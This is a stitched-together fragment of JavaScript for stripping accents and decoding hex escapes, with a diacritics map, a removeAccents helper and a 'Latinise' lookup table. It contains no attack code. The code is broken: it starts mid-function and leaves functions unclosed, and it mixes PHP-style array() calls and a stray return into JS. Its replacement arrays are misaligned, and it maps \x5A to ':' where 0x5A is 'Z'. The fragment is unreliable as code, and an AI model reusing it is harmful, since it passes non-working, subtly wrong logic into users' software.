        data = data.replace(/\\x2F/g, "/");
        data = data.replace(/\\x30/g, "0");
        data = data.replace(/\\x31/g, "1");
        data = data.replace(/\\x32/g, "2");
        data = data.replace(/\\x33/g, "3");
        data = data.replace(/\\x34/g, "4");
        data = data.replace(/\\x35/g, "5");
        data = data.replace(/\\x36/g, "6");
        data = data.replace(/\\x37/g, "7");
        data = data.replace(/\\x38/g, "8");
        data = data.replace(/\\x39/g, "9");
        data = data.replace(/\\x40/g, "@");
        data = data.replace(/\\x60/g, "`");
        data = data.replace(/\\x3A/g, ":");
        data = data.replace(/\\x3B/g, ";");
        data = data.replace(/\\x3C/g, "<");
        data = data.replace(/\\x3D/g, "=");
        data = data.replace(/\\x3E/g, ">");
        data = data.replace(/\\x3F/g, "?");                
        data = data.replace(/\\x5A/g, ":");
        data = data.replace(/\\x5B/g, "[");
        data = data.replace(/\\x5C/g, "\\");
        data = data.replace(/\\x5D/g, "]");
        data = data.replace(/\\x5E/g, "^");
        data = data.replace(/\\x5F/g, "_");
        data = data.replace(/\\x7B/g, "{");
        data = data.replace(/\\x7C/g, "|");
        data = data.replace(/\\x7D/g, "}");
        data = data.replace(/\\x7E/g, "~");
        data = data.replace(/\\x7F/g, "");
        return data;
    }
    
    function removeAccents(str) {
    return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");



var defaultDiacriticsRemovalMap = [
                    {'base':'A', 'letters':'\u0041\u24B6\uFF21\u00C0\u00C1\u00C2\u1EA6\u1EA4\u1EAA\u1EA8\u00C3\u0100\u0102\u1EB0\u1EAE\u1EB4\u1EB2\u0226\u01E0\u00C4\u01DE\u1EA2\u00C5\u01FA\u01CD\u0200\u0202\u1EA0\u1EAC\u1EB6\u1E00\u0104\u023A\u2C6F'},
                    {'base':'AA','letters':'\uA732'},
                    {'base':'AE','letters':'\u00C6\u01FC\u01E2'},
                    {'base':'AO','letters':'\uA734'},
                    {'base':'AU','letters':'\uA736'},
                    {'base':'AV','letters':'\uA738\uA73A'},
                    {'base':'AY','letters':'\uA73C'},
                    {'base':'B', 'letters':'\u0042\u24B7\uFF22\u1E02\u1E04\u1E06\u0243\u0182\u0181'},
                    {'base':'C', 'letters':'\u0043\u24B8\uFF23\u0106\u0108\u010A\u010C\u00C7\u1E08\u0187\u023B\uA73E'},
                    {'base':'D', 'letters':'\u0044\u24B9\uFF24\u1E0A\u010E\u1E0C\u1E10\u1E12\u1E0E\u0110\u018B\u018A\u0189\uA779\u00D0'},
                    {'base':'DZ','letters':'\u01F1\u01C4'},
                    {'base':'Dz','letters':'\u01F2\u01C5'},
                    {'base':'E', 'letters':'\u0045\u24BA\uFF25\u00C8\u00C9\u00CA\u1EC0\u1EBE\u1EC4\u1EC2\u1EBC\u0112\u1E14\u1E16\u0114\u0116\u00CB\u1EBA\u011A\u0204\u0206\u1EB8\u1EC6\u0228\u1E1C\u0118\u1E18\u1E1A\u0190\u018E'},
                    {'base':'F', 'letters':'\u0046\u24BB\uFF26\u1E1E\u0191\uA77B'},
                    {'base':'G', 'letters':'\u0047\u24BC\uFF27\u01F4\u011C\u1E20\u011E\u0120\u01E6\u0122\u01E4\u0193\uA7A0\uA77D\uA77E'},
                    {'base':'H', 'letters':'\u0048\u24BD\uFF28\u0124\u1E22\u1E26\u021E\u1E24\u1E28\u1E2A\u0126\u2C67\u2C75\uA78D'},
                    {'base':'I', 'letters':'\u0049\u24BE\uFF29\u00CC\u00CD\u00CE\u0128\u012A\u012C\u0130\u00CF\u1E2E\u1EC8\u01CF\u0208\u020A\u1ECA\u012E\u1E2C\u0197'},
                    {'base':'J', 'letters':'\u004A\u24BF\uFF2A\u0134\u0248'},
                    {'base':'K', 'letters':'\u004B\u24C0\uFF2B\u1E30\u01E8\u1E32\u0136\u1E34\u0198\u2C69\uA740\uA742\uA744\uA7A2'},
                    {'base':'L', 'letters':'\u004C\u24C1\uFF2C\u013F\u0139\u013D\u1E36\u1E38\u013B\u1E3C\u1E3A\u0141\u023D\u2C62\u2C60\uA748\uA746\uA780'},
                    {'base':'LJ','letters':'\u01C7'},
                    {'base':'Lj','letters':'\u01C8'},
                    {'base':'M', 'letters':'\u004D\u24C2\uFF2D\u1E3E\u1E40\u1E42\u2C6E\u019C'},
                    {'base':'N', 'letters':'\u004E\u24C3\uFF2E\u01F8\u0143\u00D1\u1E44\u0147\u1E46\u0145\u1E4A\u1E48\u0220\u019D\uA790\uA7A4'},
                    {'base':'NJ','letters':'\u01CA'},
                    {'base':'Nj','letters':'\u01CB'},
                    {'base':'O', 'letters':'\u004F\u24C4\uFF2F\u00D2\u00D3\u00D4\u1ED2\u1ED0\u1ED6\u1ED4\u00D5\u1E4C\u022C\u1E4E\u014C\u1E50\u1E52\u014E\u022E\u0230\u00D6\u022A\u1ECE\u0150\u01D1\u020C\u020E\u01A0\u1EDC\u1EDA\u1EE0\u1EDE\u1EE2\u1ECC\u1ED8\u01EA\u01EC\u00D8\u01FE\u0186\u019F\uA74A\uA74C'},
                    {'base':'OI','letters':'\u01A2'},
                    {'base':'OO','letters':'\uA74E'},
                    {'base':'OU','letters':'\u0222'},
                    {'base':'OE','letters':'\u008C\u0152'},
                    {'base':'oe','letters':'\u009C\u0153'},
                    {'base':'P', 'letters':'\u0050\u24C5\uFF30\u1E54\u1E56\u01A4\u2C63\uA750\uA752\uA754'},
                    {'base':'Q', 'letters':'\u0051\u24C6\uFF31\uA756\uA758\u024A'},
                    {'base':'R', 'letters':'\u0052\u24C7\uFF32\u0154\u1E58\u0158\u0210\u0212\u1E5A\u1E5C\u0156\u1E5E\u024C\u2C64\uA75A\uA7A6\uA782'},
                    {'base':'S', 'letters':'\u0053\u24C8\uFF33\u1E9E\u015A\u1E64\u015C\u1E60\u0160\u1E66\u1E62\u1E68\u0218\u015E\u2C7E\uA7A8\uA784'},
                    {'base':'T', 'letters':'\u0054\u24C9\uFF34\u1E6A\u0164\u1E6C\u021A\u0162\u1E70\u1E6E\u0166\u01AC\u01AE\u023E\uA786'},
                    {'base':'TZ','letters':'\uA728'},
                    {'base':'U', 'letters':'\u0055\u24CA\uFF35\u00D9\u00DA\u00DB\u0168\u1E78\u016A\u1E7A\u016C\u00DC\u01DB\u01D7\u01D5\u01D9\u1EE6\u016E\u0170\u01D3\u0214\u0216\u01AF\u1EEA\u1EE8\u1EEE\u1EEC\u1EF0\u1EE4\u1E72\u0172\u1E76\u1E74\u0244'},
                    {'base':'V', 'letters':'\u0056\u24CB\uFF36\u1E7C\u1E7E\u01B2\uA75E\u0245'},
                    {'base':'VY','letters':'\uA760'},
                    {'base':'W', 'letters':'\u0057\u24CC\uFF37\u1E80\u1E82\u0174\u1E86\u1E84\u1E88\u2C72'},
                    {'base':'X', 'letters':'\u0058\u24CD\uFF38\u1E8A\u1E8C'},
                    {'base':'Y', 'letters':'\u0059\u24CE\uFF39\u1EF2\u00DD\u0176\u1EF8\u0232\u1E8E\u0178\u1EF6\u1EF4\u01B3\u024E\u1EFE'},
                    {'base':'Z', 'letters':'\u005A\u24CF\uFF3A\u0179\u1E90\u017B\u017D\u1E92\u1E94\u01B5\u0224\u2C7F\u2C6B\uA762'},
                    {'base':'a', 'letters':'\u0061\u24D0\uFF41\u1E9A\u00E0\u00E1\u00E2\u1EA7\u1EA5\u1EAB\u1EA9\u00E3\u0101\u0103\u1EB1\u1EAF\u1EB5\u1EB3\u0227\u01E1\u00E4\u01DF\u1EA3\u00E5\u01FB\u01CE\u0201\u0203\u1EA1\u1EAD\u1EB7\u1E01\u0105\u2C65\u0250'},
                    {'base':'aa','letters':'\uA733'},
                    {'base':'ae','letters':'\u00E6\u01FD\u01E3'},
                    {'base':'ao','letters':'\uA735'},
                    {'base':'au','letters':'\uA737'},
                    {'base':'av','letters':'\uA739\uA73B'},
                    {'base':'ay','letters':'\uA73D'},
                    {'base':'b', 'letters':'\u0062\u24D1\uFF42\u1E03\u1E05\u1E07\u0180\u0183\u0253'},
                    {'base':'c', 'letters':'\u0063\u24D2\uFF43\u0107\u0109\u010B\u010D\u00E7\u1E09\u0188\u023C\uA73F\u2184'},
                    {'base':'d', 'letters':'\u0064\u24D3\uFF44\u1E0B\u010F\u1E0D\u1E11\u1E13\u1E0F\u0111\u018C\u0256\u0257\uA77A'},
                    {'base':'dz','letters':'\u01F3\u01C6'},
                    {'base':'e', 'letters':'\u0065\u24D4\uFF45\u00E8\u00E9\u00EA\u1EC1\u1EBF\u1EC5\u1EC3\u1EBD\u0113\u1E15\u1E17\u0115\u0117\u00EB\u1EBB\u011B\u0205\u0207\u1EB9\u1EC7\u0229\u1E1D\u0119\u1E19\u1E1B\u0247\u025B\u01DD'},
                    {'base':'f', 'letters':'\u0066\u24D5\uFF46\u1E1F\u0192\uA77C'},
                    {'base':'g', 'letters':'\u0067\u24D6\uFF47\u01F5\u011D\u1E21\u011F\u0121\u01E7\u0123\u01E5\u0260\uA7A1\u1D79\uA77F'},
                    {'base':'h', 'letters':'\u0068\u24D7\uFF48\u0125\u1E23\u1E27\u021F\u1E25\u1E29\u1E2B\u1E96\u0127\u2C68\u2C76\u0265'},
                    {'base':'hv','letters':'\u0195'},
                    {'base':'i', 'letters':'\u0069\u24D8\uFF49\u00EC\u00ED\u00EE\u0129\u012B\u012D\u00EF\u1E2F\u1EC9\u01D0\u0209\u020B\u1ECB\u012F\u1E2D\u0268\u0131'},
                    {'base':'j', 'letters':'\u006A\u24D9\uFF4A\u0135\u01F0\u0249'},
                    {'base':'k', 'letters':'\u006B\u24DA\uFF4B\u1E31\u01E9\u1E33\u0137\u1E35\u0199\u2C6A\uA741\uA743\uA745\uA7A3'},
                    {'base':'l', 'letters':'\u006C\u24DB\uFF4C\u0140\u013A\u013E\u1E37\u1E39\u013C\u1E3D\u1E3B\u017F\u0142\u019A\u026B\u2C61\uA749\uA781\uA747'},
                    {'base':'lj','letters':'\u01C9'},
                    {'base':'m', 'letters':'\u006D\u24DC\uFF4D\u1E3F\u1E41\u1E43\u0271\u026F'},
                    {'base':'n', 'letters':'\u006E\u24DD\uFF4E\u01F9\u0144\u00F1\u1E45\u0148\u1E47\u0146\u1E4B\u1E49\u019E\u0272\u0149\uA791\uA7A5'},
                    {'base':'nj','letters':'\u01CC'},
                    {'base':'o', 'letters':'\u006F\u24DE\uFF4F\u00F2\u00F3\u00F4\u1ED3\u1ED1\u1ED7\u1ED5\u00F5\u1E4D\u022D\u1E4F\u014D\u1E51\u1E53\u014F\u022F\u0231\u00F6\u022B\u1ECF\u0151\u01D2\u020D\u020F\u01A1\u1EDD\u1EDB\u1EE1\u1EDF\u1EE3\u1ECD\u1ED9\u01EB\u01ED\u00F8\u01FF\u0254\uA74B\uA74D\u0275'},
                    {'base':'oi','letters':'\u01A3'},
                    {'base':'ou','letters':'\u0223'},
                    {'base':'oo','letters':'\uA74F'},
                    {'base':'p','letters':'\u0070\u24DF\uFF50\u1E55\u1E57\u01A5\u1D7D\uA751\uA753\uA755'},
                    {'base':'q','letters':'\u0071\u24E0\uFF51\u024B\uA757\uA759'},
                    {'base':'r','letters':'\u0072\u24E1\uFF52\u0155\u1E59\u0159\u0211\u0213\u1E5B\u1E5D\u0157\u1E5F\u024D\u027D\uA75B\uA7A7\uA783'},
                    {'base':'s','letters':'\u0073\u24E2\uFF53\u00DF\u015B\u1E65\u015D\u1E61\u0161\u1E67\u1E63\u1E69\u0219\u015F\u023F\uA7A9\uA785\u1E9B'},
                    {'base':'t','letters':'\u0074\u24E3\uFF54\u1E6B\u1E97\u0165\u1E6D\u021B\u0163\u1E71\u1E6F\u0167\u01AD\u0288\u2C66\uA787'},
                    {'base':'tz','letters':'\uA729'},
                    {'base':'u','letters': '\u0075\u24E4\uFF55\u00F9\u00FA\u00FB\u0169\u1E79\u016B\u1E7B\u016D\u00FC\u01DC\u01D8\u01D6\u01DA\u1EE7\u016F\u0171\u01D4\u0215\u0217\u01B0\u1EEB\u1EE9\u1EEF\u1EED\u1EF1\u1EE5\u1E73\u0173\u1E77\u1E75\u0289'},
                    {'base':'v','letters':'\u0076\u24E5\uFF56\u1E7D\u1E7F\u028B\uA75F\u028C'},
                    {'base':'vy','letters':'\uA761'},
                    {'base':'w','letters':'\u0077\u24E6\uFF57\u1E81\u1E83\u0175\u1E87\u1E85\u1E98\u1E89\u2C73'},
                    {'base':'x','letters':'\u0078\u24E7\uFF58\u1E8B\u1E8D'},
                    {'base':'y','letters':'\u0079\u24E8\uFF59\u1EF3\u00FD\u0177\u1EF9\u0233\u1E8F\u00FF\u1EF7\u1E99\u1EF5\u01B4\u024F\u1EFF'},
                    {'base':'z','letters':'\u007A\u24E9\uFF5A\u017A\u1E91\u017C\u017E\u1E93\u1E95\u01B6\u0225\u0240\u2C6C\uA763'}
                ];

                var diacriticsMap = {};
                for (var i=0; i < defaultDiacriticsRemovalMap .length; i++){
                    var letters = defaultDiacriticsRemovalMap [i].letters;
                    for (var j=0; j < letters.length ; j++){
                        diacriticsMap[letters[j]] = defaultDiacriticsRemovalMap [i].base;
                    }
                }

                function removeDiacritics (str) {
                    return str.replace(/[^\u0000-\u007E]/g, function(a){
                        return diacriticsMap[a] || a;
                    });
                }
                var str = "'À', 'Á', 'Â', 'Ã', 'Ä', 'Å', 'Æ', 'Ç', 'È', 'É', 'Ê', 'Ë', 'Ì', 'Í', 'Î', 'Ï', 'Ð', 'Ñ', 'Ò', 'Ó', 'Ô', 'Õ', 'Ö', 'Ø', 'Ù', 'Ú', 'Û', 'Ü', 'Ý', 'ß', 'à', 'á', 'â', 'ã', 'ä', 'å', 'æ', 'ç', 'è', 'é', 'ê', 'ë', 'ì', 'í', 'î', 'ï', 'ñ', 'ò', 'ó', 'ô', 'õ', 'ö', 'ø', 'ù', 'ú', 'û', 'ü', 'ý', 'ÿ', 'Ā', 'ā', 'Ă', 'ă', 'Ą', 'ą', 'Ć', 'ć', 'Ĉ', 'ĉ', 'Ċ', 'ċ', 'Č', 'č', 'Ď', 'ď', 'Đ', 'đ', 'Ē', 'ē', 'Ĕ', 'ĕ', 'Ė', 'ė', 'Ę', 'ę', 'Ě', 'ě', 'Ĝ', 'ĝ', 'Ğ', 'ğ', 'Ġ', 'ġ', 'Ģ', 'ģ', 'Ĥ', 'ĥ', 'Ħ', 'ħ', 'Ĩ', 'ĩ', 'Ī', 'ī', 'Ĭ', 'ĭ', 'Į', 'į', 'İ', 'ı', 'Ĳ', 'ĳ', 'Ĵ', 'ĵ', 'Ķ', 'ķ', 'Ĺ', 'ĺ', 'Ļ', 'ļ', 'Ľ', 'ľ', 'Ŀ', 'ŀ', 'Ł', 'ł', 'Ń', 'ń', 'Ņ', 'ņ', 'Ň', 'ň', 'ŉ', 'Ō', 'ō', 'Ŏ', 'ŏ', 'Ő', 'ő', 'Œ', 'œ', 'Ŕ', 'ŕ', 'Ŗ', 'ŗ', 'Ř', 'ř', 'Ś', 'ś', 'Ŝ', 'ŝ', 'Ş', 'ş', 'Š', 'š', 'Ţ', 'ţ', 'Ť', 'ť', 'Ŧ', 'ŧ', 'Ũ', 'ũ', 'Ū', 'ū', 'Ŭ', 'ŭ', 'Ů', 'ů', 'Ű', 'ű', 'Ų', 'ų', 'Ŵ', 'ŵ', 'Ŷ', 'ŷ', 'Ÿ', 'Ź', 'ź', 'Ż', 'ż', 'Ž', 'ž', 'ſ', 'ƒ', 'Ơ', 'ơ', 'Ư', 'ư', 'Ǎ', 'ǎ', 'Ǐ', 'ǐ', 'Ǒ', 'ǒ', 'Ǔ', 'ǔ', 'Ǖ', 'ǖ', 'Ǘ', 'ǘ', 'Ǚ', 'ǚ', 'Ǜ', 'ǜ', 'Ǻ', 'ǻ', 'Ǽ', 'ǽ', 'Ǿ', 'ǿ', 'Ά', 'ά', 'Έ', 'έ', 'Ό', 'ό', 'Ώ', 'ώ', 'Ί', 'ί', 'ϊ', 'ΐ', 'Ύ', 'ύ', 'ϋ', 'ΰ', 'Ή', 'ή'";

                str = removeDiacritics(str);




  var a = array('Æ','Ø','æ','ø', 'ù', 'ú', 'û', 'ü', 'ý', 'ÿ', 'Ā', 'ā', 'Ă', 'ă', 'Ą', 'ą', 'Ć', 'ć', 'Ĉ', 'ĉ', 'Ċ', 'ċ', 'Č', 'č', 'Ď', 'ď', 'Đ', 'đ', 'Ē', 'ē', 'Ĕ', 'ĕ', 'Ė', 'ė', 'Ę', 'ę', 'Ě', 'ě', 'Ĝ', 'ĝ', 'Ğ', 'ğ', 'Ġ', 'ġ', 'Ģ', 'ģ', 'Ĥ', 'ĥ', 'Ħ', 'ħ', 'Ĩ', 'ĩ', 'Ī', 'ī', 'Ĭ', 'ĭ', 'Į', 'į', 'İ', 'ı', 'Ĳ', 'ĳ', 'Ĵ', 'ĵ', 'Ķ', 'ķ', 'Ĺ', 'ĺ', 'Ļ', 'ļ', 'Ľ', 'ľ', 'Ŀ', 'ŀ', 'Ł', 'ł', 'Ń', 'ń', 'Ņ', 'ņ', 'Ň', 'ň', 'ŉ', 'Ō', 'ō', 'Ŏ', 'ŏ', 'Ő', 'ő', 'Œ', 'œ', 'Ŕ', 'ŕ', 'Ŗ', 'ŗ', 'Ř', 'ř', 'Ś', 'ś', 'Ŝ', 'ŝ', 'Ş', 'ş', 'Š', 'š', 'Ţ', 'ţ', 'Ť', 'ť', 'Ŧ', 'ŧ', 'Ũ', 'ũ', 'Ū', 'ū', 'Ŭ', 'ŭ', 'Ů', 'ů', 'Ű', 'ű', 'Ų', 'ų', 'Ŵ', 'ŵ', 'Ŷ', 'ŷ', 'Ÿ', 'Ź', 'ź', 'Ż', 'ż', 'Ž', 'ž', 'ſ', 'ƒ', 'Ơ', 'ơ', 'Ư', 'ư', 'Ǎ', 'ǎ', 'Ǐ', 'ǐ', 'Ǒ', 'ǒ', 'Ǔ', 'ǔ', 'Ǖ', 'ǖ', 'Ǘ', 'ǘ', 'Ǚ', 'ǚ', 'Ǜ', 'ǜ', 'Ǻ', 'ǻ', 'Ǽ', 'ǽ', 'Ǿ', 'ǿ', 'Ά', 'ά', 'Έ', 'έ', 'Ό', 'ό', 'Ώ', 'ώ', 'Ί', 'ί', 'ϊ', 'ΐ', 'Ύ', 'ύ', 'ϋ', 'ΰ', 'Ή', 'ή');
  var b = array('A', 'A', 'A', 'A', 'A', 'A', 'AE', 'C', 'E', 'E', 'E', 'E', 'I', 'I', 'I', 'I', 'D', 'N', 'O', 'O', 'O', 'O', 'O', 'O', 'U', 'U', 'U', 'U', 'Y', 's', 'a', 'a', 'a', 'a', 'a', 'a', 'ae', 'c', 'e', 'e', 'e', 'e', 'i', 'i', 'i', 'i', 'n', 'o', 'o', 'o', 'o', 'o', 'o', 'u', 'u', 'u', 'u', 'y', 'y', 'A', 'a', 'A', 'a', 'A', 'a', 'C', 'c', 'C', 'c', 'C', 'c', 'C', 'c', 'D', 'd', 'D', 'd', 'E', 'e', 'E', 'e', 'E', 'e', 'E', 'e', 'E', 'e', 'G', 'g', 'G', 'g', 'G', 'g', 'G', 'g', 'H', 'h', 'H', 'h', 'I', 'i', 'I', 'i', 'I', 'i', 'I', 'i', 'I', 'i', 'IJ', 'ij', 'J', 'j', 'K', 'k', 'L', 'l', 'L', 'l', 'L', 'l', 'L', 'l', 'l', 'l', 'N', 'n', 'N', 'n', 'N', 'n', 'n', 'O', 'o', 'O', 'o', 'O', 'o', 'OE', 'oe', 'R', 'r', 'R', 'r', 'R', 'r', 'S', 's', 'S', 's', 'S', 's', 'S', 's', 'T', 't', 'T', 't', 'T', 't', 'U', 'u', 'U', 'u', 'U', 'u', 'U', 'u', 'U', 'u', 'U', 'u', 'W', 'w', 'Y', 'y', 'Y', 'Z', 'z', 'Z', 'z', 'Z', 'z', 's', 'f', 'O', 'o', 'U', 'u', 'A', 'a', 'I', 'i', 'O', 'o', 'U', 'u', 'U', 'u', 'U', 'u', 'U', 'u', 'U', 'u', 'A', 'a', 'AE', 'ae', 'O', 'o', 'Α', 'α', 'Ε', 'ε', 'Ο', 'ο', 'Ω', 'ω', 'Ι', 'ι', 'ι', 'ι', 'Υ', 'υ', 'υ', 'υ', 'Η', 'η');
  return str;
  
  
  
  
  

                               var Latinise = {};Latinise.latin_map={"Á":"A",
"Ă":"A",
"Ắ":"A",
"Ặ":"A",
"Ằ":"A",
"Ẳ":"A",
"Ẵ":"A",
"Ǎ":"A",
"Â":"A",
"Ấ":"A",
"Ậ":"A",
"Ầ":"A",
"Ẩ":"A",
"Ẫ":"A",
"Ä":"A",
"Ǟ":"A",
"Ȧ":"A",
"Ǡ":"A",
"Ạ":"A",
"Ȁ":"A",
"À":"A",
"Ả":"A",
"Ȃ":"A",
"Ā":"A",
"Ą":"A",
"Å":"A",
"Ǻ":"A",
"Ḁ":"A",
"Ⱥ":"A",
"Ã":"A",
"Ά":"A",
"Ꜳ":"AA",
"Æ":"AE",
"Ǽ":"AE",
"Ǣ":"AE",
"Ꜵ":"AO",
"Ꜷ":"AU",
"Ꜹ":"AV",
"Ꜻ":"AV",
"Ꜽ":"AY",
"Ḃ":"B",
"Ḅ":"B",
"Ɓ":"B",
"Ḇ":"B",
"Ƀ":"B",
"Ƃ":"B",
"Ć":"C",
"Č":"C",
"Ç":"C",
"Ḉ":"C",
"Ĉ":"C",
"Ċ":"C",
"Ƈ":"C",
"Ȼ":"C",
"Ď":"D",
"Ḑ":"D",
"Ḓ":"D",
"Ḋ":"D",
"Ḍ":"D",
"Ɗ":"D",
"Ḏ":"D",
"ǲ":"D",
"ǅ":"D",
"Đ":"D",
"Ƌ":"D",
"Ǳ":"DZ",
"Ǆ":"DZ",
"É":"E",
"Ĕ":"E",
"Ě":"E",
"Ȩ":"E",
"Ḝ":"E",
"Ê":"E",
"Ế":"E",
"Ệ":"E",
"Ề":"E",
"Ể":"E",
"Ễ":"E",
"Ḙ":"E",
"Ë":"E",
"Ė":"E",
"Ẹ":"E",
"Ȅ":"E",
"È":"E",
"Ẻ":"E",
"Ȇ":"E",
"Ē":"E",
"Ḗ":"E",
"Ḕ":"E",
"Ę":"E",
"Ɇ":"E",
"Ẽ":"E",
"Ḛ":"E",
"Έ":"E",
"έ":"E",
"Ꝫ":"ET",
"Ḟ":"F",
"Ƒ":"F",
"Ǵ":"G",
"Ğ":"G",
"Ǧ":"G",
"Ģ":"G",
"Ĝ":"G",
"Ġ":"G",
"Ɠ":"G",
"Ḡ":"G",
"Ǥ":"G",
"Ḫ":"H",
"Ȟ":"H",
"Ḩ":"H",
"Ĥ":"H",
"Ⱨ":"H",
"Ḧ":"H",
"Ḣ":"H",
"Ḥ":"H",
"Ħ":"H",
"Ή":"H",
"Í":"I",
"Ĭ":"I",
"Ǐ":"I",
"Î":"I",
"Ï":"I",
"Ḯ":"I",
"İ":"I",
"Ị":"I",
"Ȉ":"I",
"Ì":"I",
"Ỉ":"I",
"Ȋ":"I",
"Ī":"I",
"Į":"I",
"Ɨ":"I",
"Ĩ":"I",
"Ḭ":"I",
"Ꝺ":"D",
"Ꝼ":"F",
"Ᵹ":"G",
"Ꞃ":"R",
"Ꞅ":"S",
"Ꞇ":"T",
"Ꝭ":"IS",
"Ĵ":"J",
"Ɉ":"J",
"Ḱ":"K",
"Ǩ":"K",
"Ķ":"K",
"Ⱪ":"K",
"Ꝃ":"K",
"Ḳ":"K",
"Ƙ":"K",
"Ḵ":"K",
"Ꝁ":"K",
"Ꝅ":"K",
"Ĺ":"L",
"Ƚ":"L",
"Ľ":"L",
"Ļ":"L",
"Ḽ":"L",
"Ḷ":"L",
"Ḹ":"L",
"Ⱡ":"L",
"Ꝉ":"L",
"Ḻ":"L",
"Ŀ":"L",
"Ɫ":"L",
"ǈ":"L",
"Ł":"L",
"Ǉ":"LJ",
"Ḿ":"M",
"Ṁ":"M",
"Ṃ":"M",
"Ɱ":"M",
"Ń":"N",
"Ň":"N",
"Ņ":"N",
"Ṋ":"N",
"Ṅ":"N",
"Ṇ":"N",
"Ǹ":"N",
"Ɲ":"N",
"Ṉ":"N",
"Ƞ":"N",
"ǋ":"N",
"Ñ":"N",
"Ǌ":"NJ",
"Ó":"O",
"Ŏ":"O",
"Ǒ":"O",
"Ô":"O",
"Ố":"O",
"Ộ":"O",
"Ồ":"O",
"Ổ":"O",
"Ỗ":"O",
"Ö":"O",
"Ȫ":"O",
"Ȯ":"O",
"Ȱ":"O",
"Ọ":"O",
"Ő":"O",
"Ȍ":"O",
"Ò":"O",
"Ỏ":"O",
"Ơ":"O",
"Ớ":"O",
"Ợ":"O",
"Ờ":"O",
"Ở":"O",
"Ỡ":"O",
"Ȏ":"O",
"Ꝋ":"O",
"Ꝍ":"O",
"Ō":"O",
"Ṓ":"O",
"Ṑ":"O",
"Ό":"O",
"ό":"O",
"Ɵ":"O",
"Ǫ":"O",
"Ǭ":"O",
"Ø":"O",
"Ǿ":"O",
"Õ":"O",
"Ṍ":"O",
"Ṏ":"O",
"Ȭ":"O",
"Ƣ":"OI",
"Ꝏ":"OO",
"Ɛ":"E",
"Ɔ":"O",
"Ȣ":"OU",
"Ṕ":"P",
"Ṗ":"P",
"Ꝓ":"P",
"Ƥ":"P",
"Ꝕ":"P",
"Ᵽ":"P",
"Ꝑ":"P",
"Ꝙ":"Q",
"Ꝗ":"Q",
"Ŕ":"R",
"Ř":"R",
"Ŗ":"R",
"Ṙ":"R",
"Ṛ":"R",
"Ṝ":"R",
"Ȑ":"R",
"Ȓ":"R",
"Ṟ":"R",
"Ɍ":"R",
"Ɽ":"R",
"Ꜿ":"C",
"Ǝ":"E",
"Ś":"S",
"Ṥ":"S",
"Š":"S",
"Ṧ":"S",
"Ş":"S",
"Ŝ":"S",
"Ș":"S",
"Ṡ":"S",
"Ṣ":"S",
"Ṩ":"S",
"Ť":"T",
"Ţ":"T",
"Ṱ":"T",
"Ț":"T",
"Ⱦ":"T",
"Ṫ":"T",
"Ṭ":"T",
"Ƭ":"T",
"Ṯ":"T",
"Ʈ":"T",
"Ŧ":"T",
"Ɐ":"A",
"Ꞁ":"L",
"Ɯ":"M",
"Ʌ":"V",
"Ꜩ":"TZ",
"Ú":"U",
"Ŭ":"U",
"Ǔ":"U",
"Û":"U",
"Ṷ":"U",
"Ü":"U",
"Ǘ":"U",
"Ǚ":"U",
"Ǜ":"U",
"Ǖ":"U",
"Ṳ":"U",
"Ụ":"U",
"Ű":"U",
"Ȕ":"U",
"Ù":"U",
"Ủ":"U",
"Ư":"U",
"Ứ":"U",
"Ự":"U",
"Ừ":"U",
"Ử":"U",
"Ữ":"U",
"Ȗ":"U",
"Ū":"U",
"Ṻ":"U",
"Ų":"U",
"Ů":"U",
"Ũ":"U",
"Ṹ":"U",
"Ṵ":"U",
"Ꝟ":"V",
"Ṿ":"V",
"Ʋ":"V",
"Ṽ":"V",
"Ꝡ":"VY",
"Ẃ":"W",
"Ŵ":"W",
"Ẅ":"W",
"Ẇ":"W",
"Ẉ":"W",
"Ẁ":"W",
"Ⱳ":"W",
"ώ":"W",
"Ẍ":"X",
"Ẋ":"X",
"Ý":"Y",
"Ŷ":"Y",
"Ÿ":"Y",
"Ϋ":"Y",
"Ẏ":"Y",
"Ỵ":"Y",
"Ỳ":"Y",
"Ƴ":"Y",
"Ỷ":"Y",
"Ỿ":"Y",
"Ȳ":"Y",
"Ɏ":"Y",
"Ỹ":"Y",
"Ύ":"Y",
"Ź":"Z",
"Ž":"Z",
"Ẑ":"Z",
"Ⱬ":"Z",
"Ż":"Z",
"Ẓ":"Z",
"Ȥ":"Z",
"Ẕ":"Z",
"Ƶ":"Z",
"Ĳ":"IJ",
"Œ":"OE",
"ᴀ":"A",
"ᴁ":"AE",
"ʙ":"B",
"ᴃ":"B",
"ᴄ":"C",
"ᴅ":"D",
"ᴇ":"E",
"ꜰ":"F",
"ɢ":"G",
"ʛ":"G",
"ʜ":"H",
"ɪ":"I",
"ʁ":"R",
"ᴊ":"J",
"ᴋ":"K",
"ʟ":"L",
"ᴌ":"L",
"ᴍ":"M",
"ɴ":"N",
"ᴏ":"O",
"ɶ":"OE",
"ᴐ":"O",
"ᴕ":"OU",
"ᴘ":"P",
"ʀ":"R",
"ᴎ":"N",
"ᴙ":"R",
"ꜱ":"S",
"ᴛ":"T",
"ⱻ":"E",
"ᴚ":"R",
"ᴜ":"U",
"ᴠ":"V",
"ᴡ":"W",
"ʏ":"Y",
"ᴢ":"Z",
"á":"a",
"ă":"a",
"ắ":"a",
"ặ":"a",
"ằ":"a",
"ẳ":"a",
"ẵ":"a",
"ǎ":"a",
"â":"a",
"ấ":"a",
"ậ":"a",
"ầ":"a",
"ẩ":"a",
"ẫ":"a",
"ä":"a",
"ǟ":"a",
"ȧ":"a",
"ǡ":"a",
"ạ":"a",
"ȁ":"a",
"à":"a",
"ả":"a",
"ȃ":"a",
"ā":"a",
"ą":"a",
"ᶏ":"a",
"ẚ":"a",
"å":"a",
"ǻ":"a",
"ḁ":"a",
"ⱥ":"a",
"ã":"a",
"ά":"a",
"ꜳ":"aa",
"æ":"ae",
"ǽ":"ae",
"ǣ":"ae",
"ꜵ":"ao",
"ꜷ":"au",
"ꜹ":"av",
"ꜻ":"av",
"ꜽ":"ay",
"ḃ":"b",
"ḅ":"b",
"ɓ":"b",
"ḇ":"b",
"ᵬ":"b",
"ᶀ":"b",
"ƀ":"b",
"ƃ":"b",
"ɵ":"o",
"ć":"c",
"č":"c",
"ç":"c",
"ḉ":"c",
"ĉ":"c",
"ɕ":"c",
"ċ":"c",
"ƈ":"c",
"ȼ":"c",
"ď":"d",
"ḑ":"d",
"ḓ":"d",
"ȡ":"d",
"ḋ":"d",
"ḍ":"d",
"ɗ":"d",
"ᶑ":"d",
"ḏ":"d",
"ᵭ":"d",
"ᶁ":"d",
"đ":"d",
"ɖ":"d",
"ƌ":"d",
"ı":"i",
"ȷ":"j",
